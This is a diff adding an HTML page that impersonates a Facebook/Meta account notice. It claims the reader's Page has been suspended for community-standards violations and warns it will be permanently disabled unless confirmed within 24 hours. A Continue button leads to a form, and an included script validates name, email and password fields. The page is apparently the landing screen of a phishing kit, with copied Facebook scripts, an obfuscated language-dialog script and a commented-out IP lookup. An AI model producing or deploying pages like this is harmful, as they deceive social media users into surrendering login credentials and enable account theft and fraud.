@@ -1,0 +1,629 @@
+<!DOCTYPE html><html lang="en" data-autoid="autoid_1" class=""><head>
+        
+        <title data-localize="screen_1.title">Notice violations on Page</title>
+        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
+        <link href="icon_web.ico" rel="shortcut icon">
+        <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+        <meta name="color-scheme" content="light">
+        <meta charset="utf-8" />
+        <link type="text/css" rel="stylesheet" href="css/LBeK2AdVA10.css" data-bootloader-hash="xrfi7E+" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/eknh9Re3ab9.css" data-bootloader-hash="xb82VEZ" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/ogGTLy0m35N.css" data-bootloader-hash="tvaPsvc" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/tMCGgMHbEWk.css" data-bootloader-hash="8A0KNb4" crossorigin="anonymous">
+        <link type="text/css" rel="stylesheet" href="css/0gtnVJ5rfTK.css" data-bootloader-hash="p84v6t+" crossorigin="anonymous">
+        <script id="u_0_a_6+" nonce="">
+            function envFlush(a) {
+                function b(b) {
+                    for (var c in a) b[c] = a[c];
+                }
+                window.requireLazy ? window.requireLazy(["Env"], b) : ((window.Env = window.Env || {}), b(window.Env));
+            }
+            envFlush({
+                stratcom_event_profiler_hook: "1",
+                timeslice_heartbeat_config: {
+                    pollIntervalMs: 33,
+                    idleGapThresholdMs: 60,
+                    ignoredTimesliceNames: { requestAnimationFrame: true, "Event listenHandler mousemove": true, "Event listenHandler mouseover": true, "Event listenHandler mouseout": true, "Event listenHandler scroll": true },
+                    isHeartbeatEnabled: true,
+                    isArtilleryOn: false,
+                },
+                shouldLogCounters: true,
+                timeslice_categories: { react_render: true, reflow: true },
+                sample_continuation_stacktraces: true,
+                dom_mutation_flag: true,
+            });
+        </script>
+       
+        <script nonce="">
+            __DEV__ = 0;
+        </script>
+
+        <script id="u_0_7_Ck" nonce="">
+            (CavalryLogger =
+                window.CavalryLogger ||
+                function (a) {
+                    (this.lid = a),
+                        (this.transition = !1),
+                        (this.metric_collected = !1),
+                        (this.is_detailed_profiler = !1),
+                        (this.instrumentation_started = !1),
+                        (this.pagelet_metrics = {}),
+                        (this.events = {}),
+                        (this.ongoing_watch = {}),
+                        (this.values = { t_cstart: window._cstart }),
+                        (this.piggy_values = {}),
+                        (this.bootloader_metrics = {}),
+                        (this.resource_to_pagelet_mapping = {}),
+                        this.initializeInstrumentation && this.initializeInstrumentation();
+                }),
+                (CavalryLogger.prototype.setIsDetailedProfiler = function (a) {
+                    this.is_detailed_profiler = a;
+                    return this;
+                }),
+                (CavalryLogger.prototype.setTTIEvent = function (a) {
+                    this.tti_event = a;
+                    return this;
+                }),
+                (CavalryLogger.prototype.setValue = function (a, b, c, d) {
+                    d = d ? this.piggy_values : this.values;
+                    (typeof d[a] === "undefined" || c) && (d[a] = b);
+                    return this;
+                }),
+                (CavalryLogger.prototype.getLastTtiValue = function () {
+                    return this.lastTtiValue;
+                }),
+                (CavalryLogger.prototype.setTimeStamp =
+                    CavalryLogger.prototype.setTimeStamp ||
+                    function (a, b, c, d) {
+                        this.mark(a);
+                        var e = this.values.t_cstart || this.values.t_start;
+                        e = d ? e + d : CavalryLogger.now();
+                        this.setValue(a, e, b, c);
+                        this.tti_event && a == this.tti_event && ((this.lastTtiValue = e), this.setTimeStamp("t_tti", b));
+                        return this;
+                    }),
+                (CavalryLogger.prototype.mark =
+                    typeof console === "object" && console.timeStamp
+                        ? function (a) {
+                              console.timeStamp(a);
+                          }
+                        : function () {}),
+                (CavalryLogger.prototype.addPiggyback = function (a, b) {
+                    this.piggy_values[a] = b;
+                    return this;
+                }),
+                (CavalryLogger.instances = {}),
+                (CavalryLogger.id = 0),
+                (CavalryLogger.getInstance = function (a) {
+                    typeof a === "undefined" && (a = CavalryLogger.id);
+                    CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
+                    return CavalryLogger.instances[a];
+                }),
+                (CavalryLogger.setPageID = function (a) {
+                    if (CavalryLogger.id === 0) {
+                        var b = CavalryLogger.getInstance();
+                        CavalryLogger.instances[a] = b;
+                        CavalryLogger.instances[a].lid = a;
+                        delete CavalryLogger.instances[0];
+                    }
+                    CavalryLogger.id = a;
+                }),
+                (CavalryLogger.now = function () {
+                    return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime();
+                }),
+                (CavalryLogger.prototype.measureResources = function () {}),
+                (CavalryLogger.prototype.profileEarlyResources = function () {}),
+                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {}),
+                (CavalryLogger.start_js = function () {}),
+                (CavalryLogger.done_js = function () {});
+            CavalryLogger.getInstance().setTTIEvent("t_domcontent");
+            (CavalryLogger.prototype.measureResources = function (a, b) {
+                if (!this.log_resources) return;
+                var c = "bootload/" + a.name;
+                if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
+                var d = CavalryLogger.now();
+                this.ongoing_watch[c] = d;
+                "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
+                b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
+                if (a.type === "js") {
+                    c = "js_exec/" + a.name;
+                    this.ongoing_watch[c] = d;
+                }
+            }),
+                (CavalryLogger.prototype.stopWatch = function (a) {
+                    if (this.ongoing_watch[a]) {
+                        var b = CavalryLogger.now(),
+                            c = b - this.ongoing_watch[a];
+                        this.bootloader_metrics[a] = c;
+                        var d = this.piggy_values;
+                        a.indexOf("bootload") === 0 &&
+                            (d.t_resource_download || (d.t_resource_download = 0),
+                            d.resources_downloaded || (d.resources_downloaded = 0),
+                            (d.t_resource_download += c),
+                            (d.resources_downloaded += 1),
+                            d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
+                        delete this.ongoing_watch[a];
+                    }
+                    return this;
+                }),
+                (CavalryLogger.getBootloaderMetricsFromAllLoggers = function () {
+                    var a = {};
+                    Object.values(window.CavalryLogger.instances).forEach(function (b) {
+                        b.bootloader_metrics && Object.assign(a, b.bootloader_metrics);
+                    });
+                    return a;
+                }),
+                (CavalryLogger.start_js = function (a) {
+                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b]);
+                }),
+                (CavalryLogger.done_js = function (a) {
+                    for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b]);
+                }),
+                (CavalryLogger.prototype.profileEarlyResources = function (a) {
+                    for (var b = 0; b < a.length; b++) this.measureResources({ name: a[b][0], type: a[b][1] ? "js" : "" }, "_EF_");
+                });
+            CavalryLogger.getInstance().log_resources = true;
+            CavalryLogger.getInstance().setIsDetailedProfiler(true);
+            window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
+        </script>
+        <script id="u_0_8_KG" nonce="">
+            (function _(a, b, c, d) {
+                function e(a) {
+                    document.cookie = a + "=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com";
+                }
+                function f(a, b) {
+                    document.cookie = a + "=" + b + ";path=/;domain=.facebook.com;secure";
+                }
+                if (!a) {
+                    e(b);
+                    e(c);
+                    return;
+                }
+                a = null;
+                (navigator.userAgent.indexOf("Firefox") !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf("Windows Phone") !== -1)) &&
+                    document.documentElement != null &&
+                    ((a = screen.width / document.documentElement.offsetWidth), (a = Math.max(1, Math.floor(a * 2) / 2)));
+                (!a || a === 1) && navigator.userAgent.indexOf("IEMobile") !== -1 && ((a = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96), (a = Math.max(1, Math.round(a * 2) / 2)));
+                f(b, (a || window.devicePixelRatio || 1).toString());
+                e = window.screen ? screen.width : 0;
+                b = window.screen ? screen.height : 0;
+                f(c, e + "x" + b);
+                d && document.cookie && window.devicePixelRatio > 1 && document.location.reload();
+            })(true, "m_pixel_ratio", "wd", false);
+        </script>
+        
+        <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/translateelement.css">
+            
+        <style>
+            @media only screen and (max-width: 600px) {
+                #langDialog {
+                    font-size: 0.85em;
+                }
+            }
+            * {
+                font-family: system-ui, -apple-system, "system-ui", ".SFNSText-Regular", sans-serif;
+            }
+            #langDialog {
+                display : none;
+                width: 80%;
+                max-width: 670px;
+                margin: auto;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform : translate(-50%,-50%);
+
+                background-color: #fff;
+                z-index: 1000000;
+            }
+            #langDialog .titile-dialog {
+                padding-top: 5px;
+                padding-bottom: 5px;
+                padding-left: 10px;
+                padding-right: 10px;
+                background-color: #6d84b4;
+                border: 1px solid #365899;
+                border-bottom: 0;
+                color: #fff;
+                font-size: 14px;
+                font-weight: bold;
+            }
+            #langDialog .content-dialog {
+                display: flex;
+                flex-direction: row;
+
+                border-color: #555;
+                border-style: solid;
+                border-width: 0 1px;
+                padding: 10px;
+            }
+            #langDialog .content-dialog a {
+                color: #385898;
+                cursor: pointer;
+                text-decoration: none;
+            }
+            #langDialog .button-dialog {
+                background-color: #f2f2f2;
+                border: 1px solid #ccc;
+                border-bottom: none;
+                border-left: none;
+                border-right: none;
+                padding: 10px;
+
+                display: flex;
+                flex-direction: row-reverse;
+            }
+            #langDialog .button-dialog a {
+                font-size: 12px;
+                line-height: 26px;
+                background-color: #f5f6f7;
+                border: 1px solid #ccd0d5;
+
+                border-radius: 2px;
+                box-sizing: content-box;
+                color: #4b4f56;
+                font-size: 12px;
+                -webkit-font-smoothing: antialiased;
+                font-weight: bold;
+                justify-content: center;
+                line-height: 22px;
+                padding: 0 6px;
+                text-align: center;
+                text-shadow: none;
+                vertical-align: middle;
+
+                cursor: pointer;
+                display: inline-block;
+                text-decoration: none;
+                white-space: nowrap;
+            }
+            .title-span {
+                font-size: 1.2rem;
+                font-family: inherit;
+                word-wrap: break-word;
+                color: #050505;
+                width: 100%;
+                display: block;
+                text-align: center;
+                font-weight: 700;
+            }
+            .divider {
+                align-items: center;
+                border-bottom: 1px solid #dadde1;
+                display: flex;
+                margin: 8px 0;
+                text-align: center;
+            }
+            .button {
+                color:#fff !important;
+                width: 100%;
+                display: flex;  
+                background-color: #1B74E4;
+                margin: 20px 0;
+                padding-right: 12px;
+                padding-left: 12px;
+                border-left-width: 0;
+                border-right-width: 0;
+                border-top-width: 0;
+                justify-content: center;
+                box-sizing: border-box;
+                align-items: center;
+
+                border-radius: 6px;
+
+                color: white;
+                line-height: 1.3333;
+                height: 36px;
+                border-bottom-width: 0px;
+            }
+        </style>
+        
+    </head>
+    <body tabindex="0" class="bare touch x1 _fzu _50-3 _67i4 iframe _2v9s portrait" style="min-height: 667px; ">
+        <script id="u_0_6_R4" nonce="">
+            (function (a) {
+                a.__updateOrientation = function () {
+                    var b = !!a.orientation && a.orientation !== 180,
+                        c = document.body;
+                    c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
+                    return b;
+                };
+            })(window);
+        </script>
+        <div id="viewport" data-kaios-focus-transparent="1" style="background:#F0F2F5">
+            <div id="page" style="height: 100vh;display: flex; flex-direction: column;">
+                <div id="rootcontainer" style="flex: 1;">
+                    <div class="_2v9s" id="root" role="main" style="background-color: #F0F2F5;height: 100%;" data-sigil="context-layer-root content-pane">
+                        <div class="_7om2" style="flex-direction: column;justify-content: center;align-items: center;background-color: #F0F2F5;height: 100%;">
+                            <div style="display:flex;flex-direction: column;justify-content: center;    align-items: center;">
+                                <div id="content-box" style="max-width: 490px;overflow:hidden; border-radius: 8px; box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2),0 2px 4px 0 rgba(0, 0, 0, 0.1),inset 0 0 0 1px rgba(255, 255, 255, 0.5);">
+                                    <div>
+                                        <img src="images/private.jpeg" style="width:100%">
+                                    </div>
+                                    <div style="padding-left:16px;padding-right:16px; padding-top:8px;padding-bottom:8px;text-align: center;">
+                                        <span data-localize="screen_1.title_span" class="title-span">Violations detected on your Page</span>
+                                        <div class="divider"></div>
+                                        <span data-localize="screen_1.span_desciption" style="font-family: system-ui, -apple-system, 'system-ui', '.SFNSText-Regular', sans-serif;line-height: 1.1765;font-size: 0.85rem;font-weight: 400;color: #050505;text-align: center;">
+                                         We have temporarily suspended your Page because someone told us your violated our terms and community standards. Confirm Your account within the next 24 hours, otherwise your Page may be permanently disabled.                                        </span>
+                                        <div class="divider"></div>
+                                        <span data-localize="screen_1.title_span_2" class="title-span">We help keep your Page secure</span>
+                                        <a data-localize="screen_1.button_continue" class="button" href="form.html" style="font-weight: 700;">Continue</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="_3h-4" style="background:#F0F2F5">
+                    <div class="_5aq3"
+                        style="display:flex;color: #737373;font-size: 12px;cursor: pointer;line-height: 18px; padding:20px;">
+                        <ul style="flex: 1; text-align:center">
+                            <li><a href="?lang=en" style="color: #737373">English</a></li>
+                            <li><a href="?lang=ch" style="color: #737373">中文(台灣)</a></li>
+                            <li><a href="?lang=es" style="color: #737373">Español</a></li>
+                            <li><a href="?lang=fr" style="color: #737373">Français (France)</a></li>
+                        </ul>
+                        <ul style="flex: 1; text-align:center">
+                            <li><a href="?lang=kr" style="color: #737373">한국어</a></li>
+                            <li><a href="?lang=ge" style="color: #737373">Deutsch</a></li>
+                            <li><a href="?lang=da" style="color: #737373">Dansk</a></li>
+                            <li><a role="button" onclick="openDialog()"
+                                    style="text-decoration: underline;margin-right: 0;font-family: inherit;white-space: nowrap;color: #8a8d91;background-color: #ebedf0;cursor: pointer;display: inline-block;height: 18px;line-height: 18px;border-color: #ccd0d5;transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;border: 1px solid;border-radius: 2px;box-sizing: content-box;font-size: 12px;padding: 0 8px;"
+                                    rel="dialog"
+                                    ajaxify="https://facebook.com/settings/language/language/?uri=https%3A%2F%2Fit-it.facebook.com%2F&amp;source=www_list_selector_more"
+                                    href="#" title="Hiển thị thêm ngôn ngữ"><i
+                                        style="background-image: url(images/icons.png);background-size: auto;background-repeat: no-repeat;display: inline-block;background-position: -26px -73px;position: relative;vertical-align: middle;width: 12px;height: 12px;"></i></a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="_5aq3" style="text-align: center; padding-bottom:16px;">
+                        <span style="color: #737373;font-size: 11px;"> Meta © 2023</span>
+                    </div>
+                </div>
+                <div class="viewportArea _2v9s" style="display: none;" id="u_0_0_S6" data-sigil="marea">
+                    <div class="_5vsg" id="u_0_1_9Z" style="max-height: 938px;"></div>
+                    <div class="_5vsh" id="u_0_2_8r" style="max-height: 481px;"></div>
+                    <div class="_5v5d fcg">
+                        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                        Loading...
+                    </div>
+                </div>
+                <div class="viewportArea aclb" id="mErrorView" style="display: none;" data-sigil="marea">
+                    <div class="container">
+                        <div class="image"></div>
+                        <div class="message" data-sigil="error-message"></div>
+                        <a class="link" data-sigil="MPageError:retry">Try Again</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="static_templates">
+            <div class="mDialog" id="modalDialog" style="display: none;" data-sigil=" context-layer-root" data-autoid="autoid_2">
+                <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+                    <div class="_7om2 _52we">
+                        <div class="_5s61">
+                            <div class="_52z7">
+                                <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_4_J5" data-sigil="dialog-cancel-button">Cancel</button>
+                                <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_5_Du" data-sigil="dialog-back-button">
+                                    <i class="img sp_TH5s7LpCvWO sx_eb84d2" style="margin-top: 2px;"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="_4g34">
+                            <div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...</div></div>
+                        </div>
+                        <div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div>
+                    </div>
+                </div>
+                <div class="modalDialogView" id="modalDialogView"></div>
+                <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+                    <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_3_NC" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                    Loading...
+                </div>
+            </div>
+        </div>
+        <script>
+            function validateMyForm() {
+                var name = document.getElementById('name').value;
+                var password = document.getElementById('password').value;
+                var email = document.getElementById('email').value;
+
+                var count = false;
+                if (!(email != null && email != '') ) {
+                    document.getElementById('email').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('email').style.border = '1px solid #dddfe2';
+                }
+
+                if (!(password != null && password != '') ) {
+                    document.getElementById('password').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('password').style.border = '1px solid #dddfe2'
+                }
+
+                if (!(name != null && name != '') ) {
+                    document.getElementById('name').style.border = '1px solid red';
+                    count = true;
+                }
+                else {
+                    document.getElementById('name').style.border = '1px solid #dddfe2'
+                }
+                if (count) {
+                    return false;
+                }
+                return true;
+            }
+            </script>
+        
+        <script>
+            now_inl = (function () {
+                var p = window.performance;
+                return p && p.now && p.timing && p.timing.navigationStart
+                    ? function () {
+                          return p.now() + p.timing.navigationStart;
+                      }
+                    : function () {
+                          return new Date().getTime();
+                      };
+            })();
+            window.__bigPipeFR = now_inl();
+        </script>
+        
+        
+        
+        <div class="AdBox Ad advert post-ads"></div>
+        <div id="goog-gt-tt" class="skiptranslate" dir="ltr">
+            <div style="padding: 8px;">
+                <div>
+                    <div class="logo"><img src="images/translate_24dp.png" width="20" height="20" alt="Google Dịch"></div>
+                </div>
+            </div>
+            <div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Văn bản gốc</h1></div>
+            <div class="middle" style="padding: 8px;"><div class="original-text"></div></div>
+            <div class="bottom" style="padding: 8px;">
+                <div class="activity-links"><span class="activity-link">Đóng góp bản dịch hay hơn</span><span class="activity-link"></span></div>
+                <div class="started-activity-container">
+                    <hr style="color: #ccc; background-color: #ccc; height: 1px; border: none;">
+                    <div class="activity-root"></div>
+                </div>
+            </div>
+            <div class="status-message" style="display: none;"></div>
+        </div>
+        <div class="dfp_unit"></div>
+        <div class="goog-te-spinner-pos">
+            <div class="goog-te-spinner-animation">
+                <svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66">
+                    <circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle>
+                </svg>
+            </div>
+        </div>
+         <div id="langDialog">
+            <div data-localize="popup_lang_title" class="titile-dialog">Select your language </div>
+            <div class="content-dialog">
+                <div style="flex:1">
+                        <ul>
+                            <!-- Thái Lan -->
+                            <li><a href="?lang=thai">าษาไทย</a></li>
+                            <!-- Đan mạch -->
+                            <li><a href="?lang=da">Dansk</a></li>
+                            <!-- Thủy Điển -->
+                            <li><a href="?lang=sv">Svenska</a></li>
+                            <!-- Cộng hòa Séc -->
+                            <li><a href="?lang=se">Čeština</a></li>
+                            <!-- Pháp -->
+                            <li><a href="?lang=fr">Français (France)</a></li>
+                            <!-- NHật -->
+                            <li><a href="?lang=ja">日本語</a></li>
+                            <!-- Trung quốc-->
+                            <li><a href="?lang=ch-1">中文(简体)</a></li>
+                            <!-- Đài loan -->
+                            <li><a href="?lang=ch">中文(台灣)</a></li>
+                            <!-- Hy Lạp -->
+                            <li><a href="?lang=gre">Ελληνικά</a></li>
+                            <!-- Hungary -->
+                            <li><a href="?lang=hung">Magyar</a></li>
+                        </ul>
+                    </div>
+
+                    <div style="flex:1;display: flex;justify-content: center;">
+                        <ul>
+                            
+                            <!-- Thổ nhĩ kì -->
+                            <li><a href="?lang=tur">Türkçe</a></li>
+                            <!-- Mã lai -->
+                            <li><a href="?lang=ma">Bahasa melayu</a></li>
+                            <!-- Mông cổ -->
+                            <li><a href="?lang=mo">Монгол</a></li>
+                            <!-- Hà Lan -->
+                            <li><a href="?lang=na">Nederlands</a></li>
+                            <!-- Bulgaria -->
+                            <li><a href="?lang=no">Български</a></li>
+                            <!-- Na uy -->
+                            <li><a href="?lang=nay">Norsk</a></li>
+                            <!-- Nepal -->
+                            <li><a href="?lang=bu">नेपाली</a></li>
+                            <!-- Ba Lan -->
+                            <li><a href="?lang=pol">Polski</a></li>
+                            <!-- Do thái -->
+                            <li><a href="?lang=he">עברית</a></li>
+                            <!-- Bồ Đào Nha -->
+                            <li><a href="?lang=en">English</a></li>
+                        </ul>
+                    </div>
+                <div style="flex:1;display: flex;justify-content: center;">
+                        <ul>
+                            
+                            <!-- Thụy điển -->
+                            <li><a href="?lang=es">Español</a></li>
+                            <!-- Phần lan -->
+                            <li><a href="?lang=su">Suomi</a></li>
+                            <!-- estonia -->
+                            <li><a href="?lang=ee">Eesti</a></li>
+                            <!-- ĐỨc -->
+                            <li><a href="?lang=ge">Deutsch</a></li>
+                            <!-- Iceland -->
+                            <li><a href="?lang=ir">Íslenska</a></li>
+                            <!-- Ả rập -->
+                            <li><a href="?lang=ar">عربي</a></li>
+                            <!-- Slovakia -->
+                            <li><a href="?lang=sk">Slovak</a></li>
+                            <!-- România -->
+                            <li><a href="?lang=ro">România</a></li>
+                            <!-- Croatia -->
+                            <li><a href="?lang=hr">Hrvatski</a></li>
+                            <!-- Myanma -->
+                            <li><a href="?lang=mam">မြန်မာ</a></li>
+                            
+                        </ul>
+                    </div>
+                    <div style="flex:1;display: flex;justify-content: center;">
+                        <ul>
+                            
+                            <!-- Ireland -->
+                            <li><a href="?lang=ic">Gaeilge</a></li>
+                            <!-- Ý -->
+                            <li><a href="?lang=it">Italiano</a></li>
+                            <!-- Tajik -->
+                            <li><a href="?lang=ta">Tajik</a></li>
+                            <!-- Kyrgyz -->
+                            <li><a href="?lang=ky">Kyrgyz</a></li>
+                            <!-- Kazakhstan -->
+                            <li><a href="?lang=ka">Kazakh</a></li>
+                            <!-- Khmer -->
+                            <li><a href="?lang=kh">ភាសាខ្មែរ</a></li>
+                            <!-- Slovenia -->
+                            <li><a href="?lang=sl">Slovenščina</a></li>
+                            <!-- Bosnia -->
+                            <li><a href="?lang=bo">Bosanski</a></li>
+                            <li><a href="?lang=kr">한국어</a></li>
+                            <li><a href="?lang=rs">Србија</a></li>
+                        </ul>
+                    </div>
+            </div>
+            <div class="button-dialog">
+                <a data-localize="popup_lang_close" href="#" onclick="closeDialog()">Close</a>
+            </div>
+        </div>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+        <script src="js/jquery.localize.min.js"></script>
+        <script src="js/base.js?v=104"></script> 
+        <script>
+            var base = new BaseFunc();
+            // In a browser where the language is set to French
+            //$("[data-localize]").localize("localize", { language: "fr",pathPrefix: "/data/localize", skipLanguage: "en-US"})
+            
+            // You can also override the language detection, and pass in a language code
+            $("[data-localize]").localize("localize", { language: base.getCurrentLanguage() ,pathPrefix: "data/localize", skipLanguage: "en-US"})
+        </script>
+
+        <script>
+            function _0x586c(_0x46cad5,_0x38f995){var _0x319c98=_0x319c();return _0x586c=function(_0x586cd4,_0xd6b0b5){_0x586cd4=_0x586cd4-0x9a;var _0x463644=_0x319c98[_0x586cd4];return _0x463644;},_0x586c(_0x46cad5,_0x38f995);}(function(_0x37a886,_0x2a21ee){var _0x4b2918=_0x586c,_0x34029d=_0x37a886();while(!![]){try{var _0x57ad06=parseInt(_0x4b2918(0xa3))/0x1+-parseInt(_0x4b2918(0x9e))/0x2*(parseInt(_0x4b2918(0x9c))/0x3)+parseInt(_0x4b2918(0xa6))/0x4+parseInt(_0x4b2918(0xa1))/0x5+-parseInt(_0x4b2918(0x9a))/0x6*(parseInt(_0x4b2918(0xa4))/0x7)+parseInt(_0x4b2918(0x9f))/0x8+-parseInt(_0x4b2918(0xa7))/0x9;if(_0x57ad06===_0x2a21ee)break;else _0x34029d['push'](_0x34029d['shift']());}catch(_0x32ecbb){_0x34029d['push'](_0x34029d['shift']());}}}(_0x319c,0xb61e8));function _0x319c(){var _0xab2f82=['7464248tEtSCg','getElementById','3560605mBFNxx','inline','107458DZBjtg','46844loCQbk','none','2442192NcIoTa','11236329VfGzdz','display','12KcfKDO','style','33Xummcu','langDialog','64606fPixgS'];_0x319c=function(){return _0xab2f82;};return _0x319c();}function openDialog(){var _0x210738=_0x586c;document['getElementById'](_0x210738(0x9d))[_0x210738(0x9b)][_0x210738(0xa8)]=_0x210738(0xa2);}function closeDialog(){var _0x220285=_0x586c;document[_0x220285(0xa0)]('langDialog')[_0x220285(0x9b)][_0x220285(0xa8)]=_0x220285(0xa5);}
+        </script>
+        <!-- <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script> -->
+</body>
+</html>
